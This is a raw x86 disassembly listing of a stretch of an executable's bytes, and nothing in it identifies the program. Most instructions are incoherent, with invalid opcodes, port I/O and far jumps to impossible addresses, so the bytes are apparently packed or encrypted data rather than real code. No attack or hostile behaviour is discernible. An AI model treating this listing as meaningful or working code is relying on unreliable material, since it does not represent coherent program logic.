  4089f5:	fistp  WORD PTR [ecx]
  4089f7:	mov    edx,0x10e142d1
  4089fc:	lods   al,BYTE PTR ds:[esi]
  4089fd:	push   ss
  4089fe:	nop
  4089ff:	sbb    eax,0x31a6305d
  408a04:	jb     0x408a12
  408a06:	out    dx,eax
  408a07:	xor    BYTE PTR [esi-0x7a],ch
  408a0a:	inc    esp
  408a0b:	sbb    bl,BYTE PTR [edx+0x44]
  408a0e:	jecxz  0x408a8b
  408a10:	sub    DWORD PTR [edx],esi
  408a12:	jo     0x4089a3
  408a14:	push   0x5c6c13ee
  408a19:	fwait
  408a1a:	inc    edx
  408a1b:	sub    DWORD PTR [ebx-0x289e2e8],ecx
  408a21:	jmp    0x61c4c086
  408a26:	fwait
  408a27:	inc    ebp
  408a28:	les    esi,FWORD PTR [ebx]
  408a2a:	inc    esi
  408a2b:	imul   edi,DWORD PTR [ecx+0x4ab54ea5],0x5c
  408a32:	push   0xf90de336
  408a37:	jbe    0x408a15
  408a39:	pushf  
  408a3a:	push   0x6a
  408a3c:	sub    DWORD PTR [esi],edi
  408a3e:	gs ss sub esi,edi
  408a42:	adc    eax,0x3b565f01
  408a47:	jecxz  0x408a48
  408a49:	dec    dh
  408a4b:	fcomp  QWORD PTR [ecx-0x5f]
  408a4e:	mov    ebp,DWORD PTR [ebp+0x71]
  408a51:	fdiv   QWORD PTR [edi-0x1c9c2c8c]
  408a57:	add    eax,0x9b410de8
  408a5c:	push   ds
  408a5d:	and    BYTE PTR [eax-0x7e],dl
  408a60:	fldenv [eax+esi*8-0x24]
  408a64:	dec    esi
  408a65:	mov    al,0x6f
  408a67:	in     al,0xbb
  408a69:	or     ecx,DWORD PTR [ebx+0x1c]
  408a6c:	sbb    eax,0x4c057e55
  408a71:	pushf  
  408a72:	out    0xbb,eax
  408a74:	cmp    ebx,DWORD PTR [edx-0x5e]
  408a77:	sub    BYTE PTR [ebx+0x1e05eab3],dh
  408a7d:	inc    ebp
  408a7e:	icebp  
  408a7f:	shl    eax,1
  408a81:	mov    esi,gs
  408a83:	xlat   BYTE PTR ds:[ebx]
  408a84:	out    0x46,eax
  408a86:	pusha  
  408a87:	mov    dh,0xb4
  408a89:	jnp    0x408a97
  408a8b:	push   DWORD PTR [edi+ebp*2]
  408a8e:	in     eax,0x94
  408a90:	xor    al,0xe1
  408a92:	xor    edx,esp
  408a94:	pop    esi
  408a95:	fcmovu st,st(5)
  408a97:	or     eax,DWORD PTR [esi-0x54]
  408a9a:	aam    0x5d
  408a9c:	dec    eax
  408a9d:	leave  
  408a9e:	pop    ebp
  408a9f:	mov    eax,0x5298886c
  408aa4:	xor    DWORD PTR [esi+esi*8-0x626e748a],ecx
  408aab:	dec    edi
  408aac:	pop    esi
  408aad:	fild   WORD PTR [ecx+ebx*2]
  408ab0:	add    al,0x95
  408ab2:	jg     0x408a67
  408ab4:	int    0x9b
  408ab6:	mov    esp,0xb3c2ca15
  408abb:	test   BYTE PTR [esi],bh
  408abd:	leave  
  408abe:	adc    dl,BYTE PTR [ebp+0xa5e5bfb]
  408ac4:	pop    ebx
  408ac5:	xchg   ebp,eax
  408ac6:	jmp    0x9d39e2ff
  408acb:	(bad)  [ecx]
  408acd:	xchg   esi,eax
  408ace:	addr16 aad 0xda
  408ad1:	and    al,0x31
  408ad3:	pop    ebp
  408ad4:	jle    0x408a66
  408ad6:	cbw    
  408ad8:	jp     0x408b10
  408ada:	or     al,dh
  408adc:	mov    es,ebp
  408ade:	fistp  QWORD PTR [ebp+0x142dbbee]
  408ae4:	inc    ebx
  408ae5:	pop    ecx
  408ae6:	xchg   ebx,eax
  408ae7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408ae8:	pop    ebp
  408ae9:	jmp    0x89bf38d2
  408aee:	ins    BYTE PTR es:[edi],dx
  408aef:	test   sp,0xec0b
  408af4:	std    
  408af5:	in     eax,0xe6
  408af7:	mov    edx,DWORD PTR [esi-0xc810cab]
  408afd:	inc    ecx
  408afe:	pop    ebp
  408aff:	fld    DWORD PTR [ecx+0x199ae645]
  408b05:	mov    edi,0xe7b9195f
  408b0a:	test   BYTE PTR ds:0x8da0420c,dh
  408b10:	sbb    ah,bh
  408b12:	sbb    cl,BYTE PTR [ebp+0x6a8fa666]
  408b18:	int3   
  408b19:	cmp    al,0x28
  408b1b:	lods   eax,DWORD PTR ds:[esi]
  408b1c:	and    DWORD PTR [eax+eiz*1],edi
  408b1f:	fwait
  408b20:	adc    al,0xe6
  408b22:	setp   ch
  408b25:	daa    
  408b26:	mov    edx,DWORD PTR [ecx-0x78]
  408b29:	inc    ecx
  408b2a:	int    0x5b
  408b2c:	mov    dh,0x1a
  408b2e:	lahf   
  408b2f:	adc    DWORD PTR [ebx],0x54
  408b32:	xor    eax,0x13bc8d0b
  408b37:	push   ss
  408b38:	iret   
  408b39:	popf   
  408b3a:	arpl   WORD PTR [esi-0x68],ax
  408b3d:	sbb    eax,0xbc328364
  408b42:	sbb    DWORD PTR [eax+0x75],edx
  408b45:	in     al,0x30
  408b47:	adc    ah,BYTE PTR [edi+0x71]
  408b4a:	imul   edi,DWORD PTR [eax+0x2abaebb],0xffffffd4
  408b51:	and    al,0xaf
  408b53:	push   eax
  408b54:	ins    DWORD PTR es:[edi],dx
  408b55:	mov    edx,0x9c7ffa35
  408b5a:	inc    esp
  408b5b:	jo     0x408b2b
  408b5d:	mov    cl,0x12
  408b5f:	aaa    
  408b60:	shl    DWORD PTR [ebx-0x58],cl
  408b63:	aaa    
  408b64:	add    esi,DWORD PTR [edi+edx*2+0x4e8781e0]
  408b6b:	fistp  DWORD PTR [edi-0x24]
  408b6e:	and    ah,BYTE PTR ds:0x1312597
  408b74:	mov    cl,0x52
  408b76:	push   ss
  408b77:	cmp    dh,BYTE PTR [eax+0x3bd4d86a]
  408b7d:	pop    ebp
  408b7e:	shl    BYTE PTR [ebx+eax*2-0x10089639],0x5c
  408b86:	nop
  408b87:	icebp  
  408b88:	pusha  
  408b89:	inc    ecx
  408b8a:	(bad)  
  408b8b:	jl     0x408b6d
  408b8d:	jnp    0x408bf7
  408b8f:	cmp    al,0xa4
  408b91:	adc    eax,0x508c22f8
  408b96:	push   edx
  408b97:	sub    esi,DWORD PTR [edi]
  408b99:	in     eax,0x7d
  408b9b:	xchg   BYTE PTR [ebx],al
  408b9d:	cwde   
  408b9e:	mov    edi,0xeabd6652
  408ba3:	sub    bh,ch
  408ba5:	adc    edi,DWORD PTR ds:[ebx+0x1f]
  408ba9:	(bad)  
  408baa:	pop    edx
  408bab:	mov    al,ds:0xa7bfc9ef
  408bb0:	inc    esi
  408bb1:	out    0xc8,al
  408bb3:	mov    ebx,esp
  408bb5:	aam    0x19
  408bb7:	out    0x25,al
  408bb9:	jmp    0x408bbf
  408bbb:	fild   WORD PTR [edx-0x13]
  408bbe:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408bbf:	repz push ecx
  408bc1:	add    BYTE PTR [eax],ch
  408bc3:	je     0x408b68
  408bc5:	xchg   ebx,eax
  408bc6:	jecxz  0x408c0d
  408bc8:	or     esi,ebx
  408bca:	test   BYTE PTR [edx],bh
  408bcc:	add    BYTE PTR [eax+0x4b],0xed
  408bd0:	and    dh,BYTE PTR [esi+esi*4+0x28ad40b4]
  408bd7:	pushf  
  408bd8:	dec    esi
  408bd9:	sahf   
  408bda:	push   cs
  408bdb:	aas    
  408bdc:	mov    esp,0xda63d197
  408be1:	cmc    
  408be2:	xchg   edx,eax
  408be3:	in     eax,0xb3
  408be5:	(bad)  [ecx-0x1b]
  408be8:	sbb    eax,0xe8a70d62
  408bed:	int3   
  408bee:	mov    esi,0xf57dd683
  408bf3:	pop    ss
  408bf4:	std    
  408bf5:	sahf   
  408bf6:	mov    ds:0xcfa083ac,al
  408bfb:	dec    ebp
  408bfc:	out    dx,al
  408bfd:	into   
  408bfe:	fnstsw WORD PTR [ecx]
  408c00:	mov    ah,0xde
  408c02:	mov    edx,0x6af6d1dc
  408c07:	bound  esi,QWORD PTR [esi+0x2e]
  408c0a:	mov    edx,0xd64d99b2
  408c0f:	cmc    
  408c10:	or     eax,0x1e8dd56c
  408c15:	icebp  
  408c16:	lods   al,BYTE PTR ds:[esi]
  408c17:	sub    dl,ch
  408c19:	repnz and eax,0x297f552a
  408c1f:	cmp    eax,0xd57f8fa3
  408c24:	xor    ebp,DWORD PTR [edi+0x414f58ca]
  408c2a:	push   0xffffff8a
  408c2c:	test   DWORD PTR [ebp-0x12],edi
  408c2f:	mov    ch,0x8d
  408c31:	push   0xa47c3ed9
  408c36:	add    dl,BYTE PTR [ebx]
  408c38:	xor    BYTE PTR [eax-0xb21c73f],ah
  408c3e:	ins    DWORD PTR es:[edi],dx
  408c3f:	mov    bl,0x8f
  408c41:	cmc    
  408c42:	imul   esp,DWORD PTR [edi-0x35],0x59
  408c46:	neg    DWORD PTR [ecx+0x49]
  408c49:	xchg   ecx,edx
  408c4b:	dec    BYTE PTR [edx]
  408c4d:	push   DWORD PTR [ebp-0x10]
  408c50:	mov    eax,ds:0x41b264
  408c55:	mov    eax,DWORD PTR [eax]
  408c57:	push   DWORD PTR [eax]
  408c59:	lea    eax,ds:0x41b280
  408c5f:	jmp    0x408fac
  408c64:	mov    ebx,0x93838448
  408c69:	push   ebx
  408c6a:	mov    ebx,0x78da0248
  408c6f:	bound  ebx,QWORD PTR [ebp-0x4]
  408c72:	mov    BYTE PTR [edi+0x7070d947],cl
  408c78:	and    BYTE PTR [ebp+0x70],bh
  408c7b:	jo     0x408c89
  408c7d:	test   edx,ebp
  408c7f:	adc    BYTE PTR [ebp-0x42c5b0ac],bl
  408c85:	jp     0x408cb9
  408c87:	dec    esi
  408c88:	sbb    BYTE PTR [edi-0x22],dh
  408c8b:	fsubrp st(1),st
  408c8d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408c8e:	pop    eax
  408c8f:	call   0x9d16cc05
  408c94:	shl    BYTE PTR [esi-0x5b],cl
  408c97:	push   edi
  408c98:	or     eax,0x64c84341
  408c9d:	loop   0x408c89
  408c9f:	xchg   esp,eax
  408ca0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408ca1:	ret    0xb3a3
  408ca4:	ret    
  408ca5:	xor    eax,0x51833059
  408caa:	pop    esi
  408cab:	sbb    DWORD PTR [ecx+ebx*2-0xf09d9e3],ecx
  408cb2:	fisubr DWORD PTR [esi]
  408cb4:	jb     0x408c6b
  408cb6:	icebp  
  408cb7:	add    esp,esp
  408cb9:	jecxz  0x408c92
  408cbb:	mov    cl,0x8
  408cbd:	sar    DWORD PTR [edx-0x75e07b9b],cl
  408cc3:	fmul   DWORD PTR [eax+0x70]
  408cc6:	idiv   DWORD PTR [eax+eiz*4]
  408cc9:	data16 loope 0x408ce5
  408ccc:	(bad)  
  408cce:	xlat   BYTE PTR es:[ebx]
  408cd0:	cmp    dh,BYTE PTR [edi-0x17497832]
  408cd6:	jnp    0x408cb8
  408cd8:	pop    ss
  408cd9:	fld    TBYTE PTR [ecx+0x4aee016f]
  408cdf:	call   0x6f840a8b
  408ce4:	lea    edi,[eax+0x24]
  408ce7:	jmp    0x91d186dc
  408cec:	jmp    0x8aee6af5
  408cf1:	jbe    0x408c8b
  408cf3:	(bad)  
  408cf7:	mov    bl,0xf1
  408cf9:	leave  
  408cfa:	xor    BYTE PTR ds:0x339f1898,bl
  408d00:	cli    
  408d01:	fiadd  WORD PTR [ecx+0x410f6730]
  408d07:	mov    ecx,0x57c96487
  408d0c:	xor    DWORD PTR [edx],edx
  408d0e:	and    eax,0x8898c07
  408d13:	(bad)  
  408d14:	iret   
  408d15:	mov    DWORD PTR [esi],esp
  408d17:	outs   dx,DWORD PTR ds:[esi]
  408d18:	jmp    0xd728f4ae
  408d1d:	fdivr  DWORD PTR [edi]
  408d1f:	and    DWORD PTR [esi],edx
  408d21:	sub    DWORD PTR [edx+0x6b],eax
  408d24:	jae    0x408caf
  408d26:	push   ebp
  408d27:	adc    BYTE PTR ds:0x95ea5502,0xf
  408d2e:	es push edi
  408d30:	shl    DWORD PTR [eax],0x4
  408d33:	ss xchg esp,eax
  408d35:	xchg   edx,eax
  408d36:	sbb    eax,0xa3d299f3
  408d3b:	mov    ds:0xd1832960,eax
  408d40:	loope  0x408d8d
  408d42:	cmc    
  408d43:	lods   eax,DWORD PTR ds:[esi]
  408d44:	int3   
  408d45:	sbb    al,0x9d
  408d47:	dec    edx
  408d48:	jg     0x408db5
  408d4a:	(bad)  [edx-0x370d39dc]
  408d50:	lahf   
  408d51:	or     cl,BYTE PTR [edi-0x7e515661]
  408d57:	jmp    0x408d68
  408d59:	push   0x7a
  408d5b:	pop    edi
  408d5c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408d5d:	and    DWORD PTR [edx+0x4dea909a],eax
  408d63:	stos   BYTE PTR es:[edi],al
  408d64:	loop   0x408dca
  408d66:	jns    0x408dce
  408d68:	pop    edi
  408d69:	adc    ebx,DWORD PTR [eax-0x133e3747]
  408d6f:	push   0xffffffc0
  408d71:	cmp    BYTE PTR [ecx],0x38
  408d74:	das    
  408d75:	shl    BYTE PTR [ebp+0x3074afca],1
  408d7b:	fs jmp 0x1d106732
  408d81:	leave  
  408d82:	es add ebx,edx
  408d85:	pop    ebp
  408d86:	outs   dx,BYTE PTR ds:[esi]
  408d87:	xor    eax,0x2051e0d
  408d8c:	std    
  408d8d:	dec    ecx
  408d8e:	or     dl,bh
  408d90:	push   cs
  408d91:	add    BYTE PTR [eax-0x676c9e89],bh
  408d97:	adc    dh,ah
  408d99:	mov    ebp,ds
  408d9b:	ja     0x408da0
  408d9d:	pmuludq mm3,QWORD PTR [ecx]
  408da0:	jmp    0x423f:0xcf2002c9
  408da7:	cdq    
  408da8:	add    DWORD PTR [edx-0x42],esi
  408dab:	push   ds
  408dac:	imul   edi,DWORD PTR [ebp-0x1a6ad7d8],0xec0ab35c
  408db6:	mov    edx,0xff790f60
  408dbb:	jle    0x408dd1
  408dbd:	inc    ebp
  408dbe:	fisttp WORD PTR [edx]
  408dc0:	pop    cx
  408dc2:	fwait
  408dc3:	std    
  408dc4:	mov    esi,0x89c3b455
  408dc9:	add    al,ah
  408dcb:	into   
  408dcc:	mov    ds:0xe9fea2c5,eax
  408dd1:	stc    
  408dd2:	sbb    BYTE PTR [ecx+0x1a],0xd0
  408dd6:	mov    ds:0xa3dd0897,al
  408ddb:	stos   DWORD PTR es:[edi],eax
  408ddc:	shl    DWORD PTR [eax-0xf7e1783],0x8f
  408de3:	pop    ebp
  408de4:	int    0x53
  408de6:	out    dx,al
  408de7:	pop    esi
  408de8:	mov    ecx,0xac7ea1d
  408ded:	scas   al,BYTE PTR es:[edi]
  408dee:	popf   
  408def:	or     ebx,DWORD PTR [esi+eiz*1-0x2c4efd48]
  408df6:	shr    DWORD PTR [esi+0x7643dedb],1
  408dfc:	or     DWORD PTR [ebp+0x227cf0fd],ebp
  408e02:	dec    eax
  408e03:	xlat   BYTE PTR ds:[ebx]
  408e04:	cwde   
  408e05:	lds    edi,FWORD PTR ss:[edx-0xbe5e7a3]
  408e0c:	dec    eax
  408e0d:	ds xchg esp,eax
  408e0f:	outs   dx,DWORD PTR ds:[esi]
  408e10:	fst    QWORD PTR [ebx+0x42]
  408e13:	fstp   QWORD PTR [esi+0x66]
  408e16:	fcomp  DWORD PTR [edi+0x2b5c307e]
  408e1c:	cdq    
  408e1d:	push   esp
  408e1e:	dec    ebx
  408e1f:	jmp    0x9ad86683
  408e24:	mov    BYTE PTR [esi+0x47],cl
  408e27:	in     eax,0x18
  408e29:	pop    edx
  408e2a:	and    esp,eax
  408e2c:	out    0x85,al
  408e2e:	mov    bl,0xa5
  408e30:	mov    DWORD PTR [esi],edi
  408e32:	leave  
  408e33:	xor    ch,BYTE PTR [edi+0x33]
  408e36:	jp     0x408e98
  408e38:	bound  eax,QWORD PTR ds:[ebp-0x49]
  408e3c:	loope  0x408e4d
  408e3e:	mov    ?,ebp
  408e40:	loop   0x408e63
  408e42:	add    eax,0x81cab44e
  408e47:	inc    esp
  408e48:	adc    BYTE PTR [esi+0x14d71a05],0x72
  408e4f:	clc    
  408e50:	rol    edi,1
  408e52:	leave  
  408e53:	ins    DWORD PTR es:[edi],dx
  408e54:	cmp    ch,al
  408e56:	fxtract 
  408e58:	inc    ebx
  408e59:	xchg   ebp,eax
  408e5a:	xor    ebx,ebp
  408e5c:	aam    0xaf
  408e5e:	cmc    
  408e5f:	mov    cl,0x9
  408e61:	inc    edx
  408e62:	cwde   
  408e63:	(bad)  
  408e64:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408e65:	(bad)  [ebp+0x5b]
  408e68:	inc    eax
  408e69:	push   es
  408e6a:	sbb    eax,0xecddd27d
  408e6f:	xchg   edx,eax
  408e70:	sub    bh,al
  408e72:	adc    ebx,ecx
  408e74:	cmp    eax,0x26c3144
  408e79:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408e7a:	mov    dh,0xb3
  408e7c:	jne    0x408e79
  408e7e:	adc    al,0xe8
  408e80:	xor    eax,0x933aaf19
  408e85:	nop
  408e86:	stc    
  408e87:	fldcw  WORD PTR [ecx-0x57]
  408e8a:	aaa    
  408e8b:	mov    ah,bh
  408e8d:	and    BYTE PTR [eax+0xe],al
  408e90:	xlat   BYTE PTR ds:[ebx]
  408e91:	adc    eax,0x53bd876
  408e96:	push   ss
  408e97:	xor    BYTE PTR [eax],bl
  408e99:	xchg   ecx,eax
  408e9a:	mov    al,ds:0xe5063cb2
  408e9f:	cwde   
  408ea0:	stos   BYTE PTR es:[edi],al
  408ea1:	pusha  
  408ea2:	sub    eax,0x7859b44f
  408ea7:	mov    ch,0xf7
  408ea9:	inc    esi
  408eaa:	(bad)  
  408eab:	adc    al,0xfb
  408ead:	stos   DWORD PTR es:[edi],eax
  408eae:	addr16 sahf 
  408eb0:	retf   
  408eb1:	repz add BYTE PTR [ebx],cl
  408eb4:	sub    DWORD PTR [edi-0x10cf2650],ecx
  408eba:	push   0xa5a60735
  408ebf:	xchg   edx,eax
  408ec0:	jae    0x408ee1
  408ec2:	icebp  
  408ec3:	sub    ah,al
  408ec5:	and    eax,0x192383d1
  408eca:	fs fwait
  408ecc:	push   eax
  408ecd:	sbb    DWORD PTR [ecx],ebp
  408ecf:	into   
  408ed0:	out    0x60,eax
  408ed2:	lock jmp 0xb6a4:0xfa8c78b8
  408eda:	dec    eax
  408edb:	lahf   
  408edc:	leave  
  408edd:	nop
  408ede:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408edf:	push   ds
  408ee0:	sbb    BYTE PTR [edx-0x4946a609],al
  408ee6:	xchg   edi,eax
  408ee7:	inc    esp
  408ee8:	xchg   edi,eax
  408ee9:	mov    ah,0xc7
  408eeb:	mov    al,ds:0xa9858b52
  408ef0:	stos   BYTE PTR es:[edi],al
  408ef1:	dec    esp
  408ef2:	add    al,0x50
  408ef4:	lods   al,BYTE PTR ds:[esi]
  408ef5:	aad    0x6d
  408ef7:	add    bh,BYTE PTR [eax-0x6766e27e]
  408efd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408efe:	adc    al,0x3
  408f00:	sbb    BYTE PTR [eax-0x52dd9fa6],ah
  408f06:	sub    eax,0x36bb5257
  408f0b:	ins    BYTE PTR es:[edi],dx
  408f0c:	pop    ss
  408f0d:	dec    edi
  408f0e:	mov    dl,0x46
  408f10:	int3   
  408f11:	push   ds
  408f12:	jge    0x408f1b
  408f14:	and    eax,0x994be35b
  408f19:	dec    ebx
  408f1a:	call   0x3247:0xec1d2e15
  408f21:	jne    0x408ede
  408f23:	mov    bh,0x37
  408f25:	inc    ebx
  408f26:	dec    ecx
  408f27:	or     DWORD PTR [edi],esp
  408f29:	mov    esi,0x88575135
  408f2e:	fadd   DWORD PTR [ebp+0x64]
  408f31:	add    edi,DWORD PTR [eax-0x5e]
  408f34:	jg     0x408f37
  408f36:	push   0xfc58c241
  408f3b:	inc    ebp
  408f3c:	adc    ecx,DWORD PTR [edi+0x9]
  408f3f:	je     0x408ee9
  408f41:	pop    esp
  408f42:	inc    edi
  408f43:	imul   esp,edi,0x74
  408f46:	pusha  
  408f47:	repz mov ebx,DWORD PTR [eax+0x9]
  408f4b:	test   BYTE PTR [ebp+0x30],bl
  408f4e:	xor    ecx,DWORD PTR [ecx-0x8]
  408f51:	ins    BYTE PTR es:[edi],dx
  408f52:	xchg   ebx,eax
  408f53:	inc    edx
  408f54:	pop    edx
  408f55:	mov    BYTE PTR [esi],cl
  408f57:	retf   
  408f58:	shl    DWORD PTR [ebx+0x5e654ab0],1
  408f5e:	stos   DWORD PTR es:[edi],eax
  408f5f:	sub    al,0xc6
  408f61:	xor    BYTE PTR [ecx],al
  408f63:	mov    BYTE PTR [eax-0x14],0xf8
  408f67:	data16 adc bl,BYTE PTR [edi+0x1fef20e2]
  408f6e:	xor    eax,0xfe717a6e
  408f73:	aas    
  408f74:	mov    BYTE PTR [edx+0x63],bl
  408f77:	sub    al,0xc6
  408f79:	add    edi,DWORD PTR [edx+0x62]
  408f7c:	push   ds
  408f7d:	pop    edi
  408f7e:	ins    BYTE PTR es:[edi],dx
  408f7f:	jge    0x408f7a
  408f81:	aaa    
  408f82:	and    edx,0x3d
  408f85:	test   edi,esp
  408f87:	push   edi
  408f88:	mov    ebp,0xbde8c235
  408f8d:	mov    WORD PTR [esi-0x12521807],fs
  408f93:	inc    edi
  408f94:	inc    ebp
  408f95:	repnz iret 
  408f97:	ins    BYTE PTR es:[edi],dx
  408f98:	xor    BYTE PTR [edx-0x49],ah
  408f9b:	pop    eax
  408f9c:	test   DWORD PTR [edi+ecx*1-0x13],esp
  408fa0:	dec    ebp
  408fa1:	push   ss
  408fa2:	adc    eax,0xe3aecf04
  408fa7:	add    DWORD PTR [eax-0x10],ebp
  408faa:	mov    esi,0x8d30ff87
  408faf:	add    eax,0x41b02c
  408fb4:	jmp    0x409301
  408fb9:	add    al,0x7c
  408fbb:	out    0xcb,eax
  408fbd:	out    0xf3,eax
  408fbf:	xor    al,0xd3
  408fc1:	call   0xae1937f3
  408fc6:	jo     0x408f6a
  408fc8:	stc    
  408fc9:	ja     0x408fb1
  408fcb:	jo     0x40903d
  408fcd:	and    BYTE PTR [ebp+0x70],bh
  408fd0:	jo     0x408fa0
  408fd2:	pop    ebp
  408fd3:	and    BYTE PTR [ecx],ch
  408fd5:	out    0xcd,al
  408fd7:	cmp    BYTE PTR [edi+0x1d637b67],bl
  408fdd:	pop    esi
  408fde:	or     DWORD PTR [edi-0x43],edi
  408fe1:	jg     0x408f9f
  408fe3:	push   ds
  408fe4:	push   esp
  408fe5:	aas    
  408fe6:	dec    esp
  408fe7:	jae    0x408f9d
  408fe9:	test   BYTE PTR [esi+ebp*8],bh
  408fec:	fdivr  DWORD PTR [ecx-0x13d4a35b]
  408ff2:	push   esi
  408ff3:	imul   ebx,DWORD PTR [esi-0x47],0x3e
  408ff7:	inc    ebp
  408ff8:	shl    BYTE PTR [edx+0x7468295b],0xa2
  408fff:	fadd   DWORD PTR [ebp-0x13]
  409002:	sti    
  409003:	into   
  409004:	mov    fs,WORD PTR [ebx-0x1db5fe7e]
  40900a:	adc    edx,DWORD PTR ds:0x166e9a3
  409010:	pop    edx
  409011:	aas    
  409012:	mov    dh,0x82
  409014:	mov    ebp,0xe4872248
  409019:	ja     0x408fe6
  40901b:	sub    eax,0xce6043e5
  409020:	adc    al,0xde
  409022:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409023:	ins    DWORD PTR es:[edi],dx
  409024:	mov    ebp,0x6e9cf23d
  409029:	add    DWORD PTR [ebx+0x5f],esi
  40902c:	imul   edi,DWORD PTR [edx-0x70],0x51
  409030:	pop    edi
  409031:	mov    ah,0x5d
  409033:	lds    edi,FWORD PTR [ecx-0x21]
  409036:	dec    esi
  409037:	pushf  
  409038:	cmp    eax,0xea2422b9
  40903d:	and    al,0xa9
  40903f:	sbb    eax,0x526a7ba0
  409044:	mov    ?,WORD PTR [ebp+0x5e]
  409047:	(bad)  
  409048:	fnstcw WORD PTR [ebx-0x64]
  40904b:	xchg   ebp,eax
  40904c:	add    cl,BYTE PTR [edx*4-0x43065f80]
  409053:	add    al,0x8a
  409055:	add    edi,esp
  409057:	(bad)  
  409058:	ins    BYTE PTR es:[edi],dx
  409059:	test   DWORD PTR [edx],eax
  40905b:	fcmovnb st,st(1)
  40905d:	push   cs
  40905e:	mov    edx,0xb102e709
  409063:	call   0x1c49:0x81ace44e
  40906a:	ret    
  40906b:	sbb    esp,DWORD PTR [eax-0x16c9bfb7]
  409071:	push   ecx
  409072:	push   edi
  409073:	das    
  409074:	add    al,0xc4
  409076:	mov    bl,0x27
  409078:	dec    edi
  409079:	(bad)  
  40907a:	push   ecx
  40907b:	and    eax,esi
  40907d:	pop    edx
  40907e:	unpcklps xmm3,XMMWORD PTR ds:0xaf5c1b01
  409085:	xchg   edx,eax
  409086:	mov    DWORD PTR [eax+0x75],edi
  409089:	jae    0x4090e4
  40908b:	pop    es
  40908c:	sbb    eax,0x10091f44
  409091:	cmp    eax,0x3cb4e04
  409096:	push   edi
  409097:	and    BYTE PTR [esi],0x82
  40909a:	sub    eax,0xde0d5294
  40909f:	xlat   BYTE PTR ds:[ebx]
  4090a0:	test   al,0x33
  4090a2:	xchg   esp,eax
  4090a3:	xchg   esi,eax
  4090a4:	jge    0x409065
  4090a6:	rol    BYTE PTR [edi-0xc],cl
  4090a9:	mov    eax,ds:0x9758cd38
  4090ae:	push   esi
  4090af:	mov    cl,dh
  4090b1:	fadd   DWORD PTR [esi]
  4090b3:	inc    esi
  4090b4:	stc    
  4090b5:	and    cl,BYTE PTR [edx]
  4090b7:	(bad)  
  4090b8:	(bad)  
  4090b9:	mov    eax,0x5bce2b22
  4090be:	rcl    DWORD PTR [ecx+0x2c],0x8c
  4090c2:	push   es
  4090c3:	pop    ss
  4090c4:	js     0x40904b
  4090c6:	test   al,0x2a
  4090c8:	es xchg ebx,eax
  4090ca:	lds    esp,FWORD PTR [ecx+eax*4+0x7a72a800]
  4090d1:	shl    DWORD PTR [ecx-0x358a0d6b],0x5c
  4090d8:	pusha  
  4090d9:	stos   BYTE PTR es:[edi],al
  4090da:	add    BYTE PTR [eax],dh
  4090dc:	nop
  4090dd:	imul   ebx,edx,0xb54b0278
  4090e3:	mov    ecx,0x85aeb2a4
  4090e8:	mov    eax,0x156343b3
  4090ed:	mov    eax,0xa2ec9466
  4090f2:	and    DWORD PTR [esi-0x311fd8ed],ebx
  4090f8:	fsubr  QWORD PTR [edx-0x6a]
  4090fb:	div    dh
  4090fd:	icebp  
  4090fe:	jne    0x4090a7
  409100:	and    al,0x73
  409102:	in     eax,dx
  409103:	jge    0x4090c5
  409105:	mov    edi,0x3e54ee0c
  40910a:	mov    esp,eax
  40910c:	pop    ecx
  40910d:	pop    edx
  40910e:	aas    
  40910f:	add    al,0xbf
  409111:	mov    bh,0x83
  409113:	jno    0x4090e3
  409115:	pop    esi
  409116:	sbb    edx,DWORD PTR [ecx]
  409118:	add    BYTE PTR ds:0xca2a622c,ah
  40911e:	sbb    al,0x5a
  409120:	jne    0x409190
  409122:	das    
  409123:	xchg   esp,eax
  409124:	enter  0x93ea,0xff
  409128:	aad    0x6f
  40912a:	fldcw  WORD PTR [edx]
  40912c:	xchg   esi,eax
  40912d:	sahf   
  40912e:	sti    
  40912f:	test   eax,0x3fa0e57b
  409134:	loope  0x40919b
  409136:	test   BYTE PTR [ebx+ebp*4],ah
  409139:	inc    esi
  40913a:	es lahf 
  40913c:	xchg   edi,eax
  40913d:	add    esi,esp
  40913f:	xchg   edx,eax
  409140:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409141:	xchg   edi,eax
  409142:	fcom   DWORD PTR ds:0x1c5d6929
  409148:	mov    al,ds:0x2ecf1e6c
  40914d:	rol    BYTE PTR [ecx],cl
  40914f:	(bad)  
  409150:	lods   eax,DWORD PTR ds:[esi]
  409151:	outs   dx,DWORD PTR ds:[esi]
  409152:	loope  0x4090ef
  409154:	mov    edi,0x3a828c03
  409159:	fld    QWORD PTR [ebp-0x1e]
  40915c:	mul    cl
  40915e:	lds    ecx,FWORD PTR [bx+di-0x3c2]
  409163:	mov    bl,0xc4
  409165:	test   al,0xb7
  409167:	fst    DWORD PTR [eax-0x77a4e782]
  40916d:	mov    ds:0x85152737,al
  409172:	dec    ebp
  409173:	mov    ah,0x27
  409175:	xchg   esp,eax
  409176:	inc    esi
  409177:	sub    ch,BYTE PTR [ebx-0x36f06931]
  40917d:	mov    ?,WORD PTR [edx]
  40917f:	mov    eax,0xc7633b25
  409184:	push   esp
  409185:	inc    ebx
  409186:	cmp    DWORD PTR [edx],edx
  409188:	jmp    0x64ac316a
  40918d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40918e:	inc    esp
  40918f:	mov    edi,0x4ceea42f
  409194:	mov    esi,0xebbe2072
  409199:	adc    BYTE PTR [ebx+ebp*1+0x6e],ah
  40919d:	mov    fs,WORD PTR [ebx]
  40919f:	sub    DWORD PTR [ebx-0x34ba4b9],ebp
  4091a5:	stos   DWORD PTR es:[edi],eax
  4091a6:	pusha  
  4091a7:	sahf   
  4091a8:	sbb    bl,BYTE PTR [ebx+0x53]
  4091ab:	sbb    eax,eax
  4091ad:	sub    edx,DWORD PTR [ebp-0x25]
  4091b0:	jg     0x409140
  4091b2:	jmp    0xfd022580
  4091b7:	jecxz  0x4091b1
  4091b9:	sub    ecx,DWORD PTR [ebx]
  4091bb:	push   eax
  4091bc:	add    ebp,DWORD PTR fs:[edx+0x28c90df9]
